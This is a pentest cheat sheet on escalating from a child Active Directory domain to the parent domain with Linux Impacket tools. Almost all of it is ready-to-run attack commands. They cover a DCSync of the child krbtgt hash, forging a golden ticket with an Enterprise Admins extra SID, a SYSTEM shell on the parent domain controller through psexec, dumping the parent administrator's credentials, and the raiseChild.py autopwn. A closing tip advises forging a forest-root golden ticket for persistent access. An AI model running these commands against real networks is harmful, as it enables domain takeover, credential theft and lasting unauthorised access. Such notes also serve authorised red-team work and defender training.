# Attacking Domain Trusts — Child → Parent (Linux)

Same attack, same data requirements — Linux tooling instead of Mimikatz/Rubeus.

---

## Gather Required Data

DCSync child domain `krbtgt`:

```bash
secretsdump.py <CHILD_DOMAIN>/<USER>@<CHILD_DC_IP> -just-dc-user <CHILD_DOMAIN>/krbtgt
```

Get child domain SID:

```bash
lookupsid.py <CHILD_DOMAIN>/<USER>@<CHILD_DC_IP> | grep "Domain SID"
```

Get parent domain SID + confirm Enterprise Admins RID (always 519):

```bash
lookupsid.py <CHILD_DOMAIN>/<USER>@<PARENT_DC_IP> | grep -B12 "Enterprise Admins"
```

EA SID = parent domain SID + `-519`

---

## Forge Golden Ticket with ticketer.py

```bash
ticketer.py -nthash <KRBTGT_HASH> -domain <CHILD_FQDN> -domain-sid <CHILD_SID> -extra-sid <PARENT_EA_SID> <FAKEUSER>
```

Output: `<FAKEUSER>.ccache`

Set it as the active credential cache:

```bash
export KRB5CCNAME=<FAKEUSER>.ccache
```

---

## Use the Ticket

SYSTEM shell on parent DC via psexec:

```bash
psexec.py <CHILD_FQDN>/<FAKEUSER>@<PARENT_DC_FQDN> -k -no-pass -target-ip <PARENT_DC_IP>
```

DCSync a specific user in the parent domain:

```bash
secretsdump.py -just-dc-user <PARENT_DOMAIN>/administrator -k -no-pass <PARENT_DC_FQDN>
```

---

## Automated — raiseChild.py

Does all of the above in one command: grabs EA SID, DCsyncs child `krbtgt`, forges ticket, dumps parent admin creds, drops into psexec shell:

```bash
raiseChild.py -target-exec <PARENT_DC_IP> <CHILD_FQDN>/<CHILD_ADMIN>
```

> [!warning] `raiseChild.py` is an autopwn script — if it breaks something in production you won't know why. Understand the manual steps first, use this only if time-boxed and you've already verified the manual path works.

> [!tip] After getting parent domain access, DCSync `krbtgt` of the parent → Golden Ticket for the forest root = persistent forest-wide access. Always do this before cleanup.